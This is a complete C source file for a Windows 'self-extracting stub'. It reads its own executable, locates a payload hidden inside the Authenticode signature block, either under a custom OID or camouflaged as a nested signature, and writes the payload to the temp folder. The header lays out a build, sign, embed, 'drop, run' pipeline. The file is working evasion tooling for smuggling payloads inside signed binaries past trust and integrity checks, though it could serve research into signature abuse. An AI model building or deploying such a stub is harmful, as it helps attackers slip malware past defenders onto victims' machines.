/*
 * SigStash Self-Extracting Stub
 *
 * Reads its own PE from disk, scans WIN_CERTIFICATE for the target OID,
 * extracts the OCTET STRING payload, and writes it to %TEMP%\sigstash_out.bin.
 *
 * No separate loader binary needed. Embed payload, sign, drop, run.
 *
 * Supports both direct OID and camouflage (SPC_NESTED_SIGNATURE) mode.
 * Set CAMOUFLAGE_MODE to 1 at compile time for camouflage extraction.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -s -o stub.exe stub.c -lkernel32
 *   x86_64-w64-mingw32-gcc -O2 -s -DCAMOUFLAGE_MODE=1 -o stub_camo.exe stub.c -lkernel32
 *
 * Pipeline:
 *   1. Compile stub.exe
 *   2. Sign:  osslsigncode sign -certs ca.crt -key ca.key -in stub.exe -out signed.exe
 *   3. Embed: python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o final.exe
 *   4. Run:   final.exe -> writes payload to %TEMP%\sigstash_out.bin
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifndef CAMOUFLAGE_MODE
#define CAMOUFLAGE_MODE 0
#endif

/*
 * Default OID: 1.3.6.1.4.1.311.99.1
 * DER: 06 09 2b 06 01 04 01 82 37 63 01
 */
static const unsigned char OID_DIRECT[] = {
    0x06, 0x09, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x63, 0x01
};
#define OID_DIRECT_LEN sizeof(OID_DIRECT)

/*
 * SPC_NESTED_SIGNATURE OID: 1.3.6.1.4.1.311.2.4.1
 * DER: 06 0a 2b 06 01 04 01 82 37 02 04 01
 */
static const unsigned char OID_NESTED[] = {
    0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x04, 0x01
};
#define OID_NESTED_LEN sizeof(OID_NESTED)

/* Parse DER length. Advances *pos. */
static DWORD der_len(const unsigned char *buf, DWORD *pos, DWORD limit) {
    if (*pos >= limit) return 0;
    unsigned char b = buf[(*pos)++];
    if (b < 0x80) return b;
    int n = b & 0x7f;
    if (n > 4 || *pos + (DWORD)n > limit) return 0;
    DWORD len = 0;
    for (int i = 0; i < n; i++)
        len = (len << 8) | buf[(*pos)++];
    return len;
}

/* Skip a TLV (tag + length + content). Returns end position. */
static DWORD skip_tlv(const unsigned char *buf, DWORD pos, DWORD limit) {
    if (pos >= limit) return limit;
    pos++; /* tag */
    DWORD len = der_len(buf, &pos, limit);
    return pos + len;
}

/*
 * Direct mode: scan for OID needle, read SET { OCTET STRING { payload } }
 */
static unsigned char *extract_direct(const unsigned char *cert, DWORD cert_size,
                                     DWORD *out_len) {
    *out_len = 0;
    for (DWORD i = 0; i + OID_DIRECT_LEN < cert_size; i++) {
        if (memcmp(cert + i, OID_DIRECT, OID_DIRECT_LEN) != 0) continue;
        DWORD pos = i + OID_DIRECT_LEN;
        if (pos >= cert_size || cert[pos] != 0x31) continue;
        pos++;
        DWORD set_len = der_len(cert, &pos, cert_size);
        if (set_len == 0) continue;
        if (pos >= cert_size || cert[pos] != 0x04) continue;
        pos++;
        DWORD payload_len = der_len(cert, &pos, cert_size);
        if (payload_len == 0 || pos + payload_len > cert_size) continue;
        unsigned char *out = (unsigned char *)malloc(payload_len);
        if (!out) return NULL;
        memcpy(out, cert + pos, payload_len);
        *out_len = payload_len;
        return out;
    }
    return NULL;
}

/*
 * Camouflage mode: scan for SPC_NESTED_SIGNATURE OID, then walk
 * SET { ContentInfo { SignedData { encapContentInfo { [0] { OCTET STRING } } } } }
 */
static unsigned char *extract_camouflage(const unsigned char *cert, DWORD cert_size,
                                         DWORD *out_len) {
    *out_len = 0;
    for (DWORD i = 0; i + OID_NESTED_LEN < cert_size; i++) {
        if (memcmp(cert + i, OID_NESTED, OID_NESTED_LEN) != 0) continue;
        DWORD pos = i + OID_NESTED_LEN;

        /* SET */
        if (pos >= cert_size || cert[pos] != 0x31) continue;
        pos++;
        der_len(cert, &pos, cert_size);

        /* ContentInfo SEQUENCE */
        if (pos >= cert_size || cert[pos] != 0x30) continue;
        pos++;
        der_len(cert, &pos, cert_size);

        /* contentType OID (skip) */
        pos = skip_tlv(cert, pos, cert_size);

        /* [0] EXPLICIT */
        if (pos >= cert_size || cert[pos] != 0xA0) continue;
        pos++;
        der_len(cert, &pos, cert_size);

        /* SignedData SEQUENCE */
        if (pos >= cert_size || cert[pos] != 0x30) continue;
        pos++;
        DWORD sd_end_calc = pos;
        DWORD sd_len = der_len(cert, &pos, cert_size);
        DWORD sd_end = pos + sd_len;

        /* version (skip) */
        pos = skip_tlv(cert, pos, sd_end);
        /* digestAlgorithms (skip) */
        pos = skip_tlv(cert, pos, sd_end);

        /* encapContentInfo SEQUENCE */
        if (pos >= sd_end || cert[pos] != 0x30) continue;
        pos++;
        der_len(cert, &pos, sd_end);

        /* contentType OID (skip) */
        pos = skip_tlv(cert, pos, sd_end);

        /* [0] EXPLICIT wrapping OCTET STRING */
        if (pos >= sd_end || cert[pos] != 0xA0) continue;
        pos++;
        der_len(cert, &pos, sd_end);

        /* OCTET STRING */
        if (pos >= sd_end || cert[pos] != 0x04) continue;
        pos++;
        DWORD payload_len = der_len(cert, &pos, sd_end);
        if (payload_len == 0 || pos + payload_len > cert_size) continue;

        unsigned char *out = (unsigned char *)malloc(payload_len);
        if (!out) return NULL;
        memcpy(out, cert + pos, payload_len);
        *out_len = payload_len;
        return out;
    }
    return NULL;
}

int main(void) {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {
        fprintf(stderr, "[!] GetModuleFileName failed: %lu\n", GetLastError());
        return 1;
    }

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Cannot open self: %lu\n", GetLastError());
        return 1;
    }
    DWORD file_size = GetFileSize(hFile, NULL);
    unsigned char *data = (unsigned char *)malloc(file_size);
    if (!data) { CloseHandle(hFile); return 1; }
    DWORD read_bytes;
    ReadFile(hFile, data, file_size, &read_bytes, NULL);
    CloseHandle(hFile);

    if (read_bytes < 0x40 || data[0] != 'M' || data[1] != 'Z') {
        fprintf(stderr, "[!] Not a PE\n");
        free(data); return 1;
    }

    DWORD pe_off;
    memcpy(&pe_off, data + 0x3c, 4);
    WORD magic;
    memcpy(&magic, data + pe_off + 0x18, 2);

    DWORD cert_dir_off;
    if (magic == 0x20b)      cert_dir_off = pe_off + 0x18 + 0x90;
    else if (magic == 0x10b) cert_dir_off = pe_off + 0x18 + 0x80;
    else { fprintf(stderr, "[!] Unknown PE magic\n"); free(data); return 1; }

    if (cert_dir_off + 8 > file_size) {
        fprintf(stderr, "[!] No security directory\n"); free(data); return 1;
    }

    DWORD cert_rva, cert_size;
    memcpy(&cert_rva, data + cert_dir_off, 4);
    memcpy(&cert_size, data + cert_dir_off + 4, 4);

    if (cert_rva == 0 || cert_size == 0 || cert_rva + cert_size > file_size) {
        fprintf(stderr, "[!] No embedded signature\n"); free(data); return 1;
    }

    const unsigned char *cert_data = data + cert_rva + 8;
    DWORD cert_data_len = cert_size - 8;

    DWORD payload_len = 0;
    unsigned char *payload;

#if CAMOUFLAGE_MODE
    payload = extract_camouflage(cert_data, cert_data_len, &payload_len);
    const char *mode = "camouflage";
#else
    payload = extract_direct(cert_data, cert_data_len, &payload_len);
    const char *mode = "direct";
#endif

    if (!payload || payload_len == 0) {
        fprintf(stderr, "[!] No payload found (%s mode)\n", mode);
        free(data); return 1;
    }

    fprintf(stderr, "[+] Found payload: %lu bytes (%s)\n", (unsigned long)payload_len, mode);

    char out_path[MAX_PATH];
    GetTempPathA(MAX_PATH, out_path);
    strcat(out_path, "sigstash_out.bin");

    HANDLE hOut = CreateFileA(out_path, GENERIC_WRITE, 0,
                              NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Cannot create output: %lu\n", GetLastError());
        free(payload); free(data); return 1;
    }
    DWORD written;
    WriteFile(hOut, payload, payload_len, &written, NULL);
    CloseHandle(hOut);

    fprintf(stderr, "[+] Written to: %s\n", out_path);

    free(payload);
    free(data);
    return 0;
}
